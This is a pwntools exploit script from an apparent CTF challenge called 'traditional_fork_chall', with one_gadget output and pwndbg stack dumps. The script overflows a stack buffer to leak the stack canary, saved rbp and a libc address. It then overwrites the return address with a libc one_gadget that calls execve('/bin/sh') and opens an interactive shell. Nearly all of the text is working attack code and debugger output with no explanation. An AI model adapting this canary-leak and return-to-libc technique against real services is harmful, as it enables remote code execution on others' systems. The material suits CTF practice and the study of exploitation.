"""
⬢ [Docker] ❯ one_gadget libc.so.6
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebc85 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebce2 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebd38 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
"""

from pwn import *
from ctftools.pwn.common import connect

exe = ELF("traditional_fork_chall_patched")
io = connect(exe, "host", 1337)


offset = 0x108
io.sendline(b'A' * (offset + 1))
canary_rbp = io.recvline().strip().replace(b'A', b'')
canary = int.from_bytes(canary_rbp[:7], 'little')
saved_rbp = int.from_bytes(canary_rbp[7:15], 'little')
canary <<= 8
print(f'{hex(canary) = }')
print(f'{hex(saved_rbp) = }')
io.recvuntil(b'*** stack smashing detected ***: terminated\n')


io.sendline(b'')
libc_leaked = int.from_bytes(io.recvline().strip().replace(b'A', b'')[:8], 'little')
libc = libc_leaked - 0x7caea68090c8 + 0x7caea6400000
print(f'{hex(libc) = }')
# io.interactive()

win = libc + 0xebd3f
payload = b'\x00' * offset + pack(canary) + pack(saved_rbp) + pack(win) * 30
# payload = b'\x00' * offset + pack(0) + pack(saved_rbp) + pack(win) * 3
print(payload)
io.sendline(payload)
# io.sendline(b'A' * 0x108 + pack(win) * 3)

io.interactive()


"""
00:0000│ rsp 0x7ffef324b890 —▸ 0x739a0db2a0c8 (_rtld_global+4232) ◂— 0x739a0db2a0c8 (_rtld_global+4232)
01:0008│-108 0x7ffef324b898 —▸ 0x739a0db2a0c8 (_rtld_global+4232) ◂— 0x739a0db2a0c8 (_rtld_global+4232)
02:0010│-100 0x7ffef324b8a0 —▸ 0x739a0db2a0d8 (_rtld_global+4248) —▸ 0x739a0daeaa00 ◂— 0x739a0db2a0d8 (_rtld_global+4248)
03:0018│-0f8 0x7ffef324b8a8 —▸ 0x739a0db2a0d8 (_rtld_global+4248) —▸ 0x739a0daeaa00 ◂— 0x739a0db2a0d8 (_rtld_global+4248)
04:0020│-0f0 0x7ffef324b8b0 ◂— 0
... ↓        3 skipped
pwndbg> 
08:0040│-0d0 0x7ffef324b8d0 ◂— 0
... ↓     2 skipped
0b:0058│-0b8 0x7ffef324b8e8 ◂— 0x6b00000000
0c:0060│-0b0 0x7ffef324b8f0 ◂— 0
... ↓     3 skipped
pwndbg> 
10:0080│-090 0x7ffef324b910 ◂— 0
... ↓     2 skipped
13:0098│-078 0x7ffef324b928 ◂— 0xff00000000
14:00a0│-070 0x7ffef324b930 ◂— 0
15:00a8│-068 0x7ffef324b938 ◂— 0xff
16:00b0│-060 0x7ffef324b940 ◂— 0
17:00b8│-058 0x7ffef324b948 ◂— 0xff
pwndbg> 
18:00c0│-050 0x7ffef324b950 ◂— 0
... ↓     4 skipped
1d:00e8│-028 0x7ffef324b978 ◂— 0x9c36f70fd3ee1700
1e:00f0│-020 0x7ffef324b980 ◂— 0
1f:00f8│-018 0x7ffef324b988 ◂— 0
pwndbg> 
20:0100│-010 0x7ffef324b990 —▸ 0x7ffef324b9c0 ◂— 1
21:0108│-008 0x7ffef324b998 ◂— 0x9c36f70fd3ee1700
22:0110│ rbp 0x7ffef324b9a0 —▸ 0x7ffef324b9c0 ◂— 1
23:0118│+008 0x7ffef324b9a8 —▸ 0x5714fc66436b (main+82) ◂— mov edi, 0
24:0120│+010 0x7ffef324b9b0 ◂— 0
25:0128│+018 0x7ffef324b9b8 ◂— 0x9c36f70fd3ee1700
26:0130│+020 0x7ffef324b9c0 ◂— 1
27:0138│+028 0x7ffef324b9c8 —▸ 0x739a0d829d90 ◂— mov edi, eax
pwndbg> 
28:0140│+030 0x7ffef324b9d0 ◂— 0
29:0148│+038 0x7ffef324b9d8 —▸ 0x5714fc664319 (main) ◂— endbr64 
2a:0150│+040 0x7ffef324b9e0 ◂— 0x100000000
2b:0158│+048 0x7ffef324b9e8 —▸ 0x7ffef324bad8 —▸ 0x7ffef324c2e3 ◂— '/workspaces/ctf-writeup/2025/TSGLIVECTF/pwnable/traditional_fork_chall/traditional_fork_chall_patched'
2c:0160│+050 0x7ffef324b9f0 ◂— 0
2d:0168│+058 0x7ffef324b9f8 ◂— 0xaf2f31923d34dd63
2e:0170│+060 0x7ffef324ba00 —▸ 0x7ffef324bad8 —▸ 0x7ffef324c2e3 ◂— '/workspaces/ctf-writeup/2025/TSGLIVECTF/pwnable/traditional_fork_chall/traditional_fork_chall_patched'
2f:0178│+068 0x7ffef324ba08 —▸ 0x5714fc664319 (main) ◂— endbr64 
pwndbg> 
30:0180│+070 0x7ffef324ba10 —▸ 0x5714fc666d90 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5714fc6641c0 (__do_global_dtors_aux) ◂— endbr64 
31:0188│+078 0x7ffef324ba18 —▸ 0x739a0db29040 (_rtld_global) —▸ 0x739a0db2a2e0 —▸ 0x5714fc663000 ◂— 0x10102464c457f
32:0190│+080 0x7ffef324ba20 ◂— 0x50d2d7db4e96dd63
33:0198│+088 0x7ffef324ba28 ◂— 0x481b2a9707bedd63
34:01a0│+090 0x7ffef324ba30 ◂— 0x739a00000000
35:01a8│+098 0x7ffef324ba38 ◂— 0
... ↓     2 skipped
pwndbg> 
38:01c0│+0b0 0x7ffef324ba50 ◂— 0
39:01c8│+0b8 0x7ffef324ba58 ◂— 0x9c36f70fd3ee1700
3a:01d0│+0c0 0x7ffef324ba60 ◂— 0
3b:01d8│+0c8 0x7ffef324ba68 —▸ 0x739a0d829e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]
3c:01e0│+0d0 0x7ffef324ba70 —▸ 0x7ffef324bae8 —▸ 0x7ffef324c349 ◂— 'SHELL=/bin/bash'
3d:01e8│+0d8 0x7ffef324ba78 —▸ 0x5714fc666d90 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5714fc6641c0 (__do_global_dtors_aux) ◂— endbr64 
3e:01f0│+0e0 0x7ffef324ba80 —▸ 0x739a0db2a2e0 —▸ 0x5714fc663000 ◂— 0x10102464c457f
"""